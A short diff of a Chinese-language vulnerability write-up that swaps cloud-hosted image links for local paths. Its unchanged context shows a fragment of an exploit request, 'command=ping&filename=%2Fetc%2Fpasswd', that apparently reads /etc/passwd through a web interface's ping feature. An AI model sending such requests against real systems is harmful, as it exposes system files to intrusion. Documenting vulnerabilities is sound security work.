@@ -20,7 +20,7 @@
 
 登录页面
 
-![img](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101852340.png)
+![img](./images/202202101852340.png)
 
 发送请求包
 
@@ -40,4 +40,4 @@ Connection: close
 command=ping&filename=%2Fetc%2Fpasswd&cmdParam=
 ```
 
-![img](https://typora-1308934770.cos.ap-beijing.myqcloud.com/202202101852498.png)
+![img](./images/202202101852498.png)
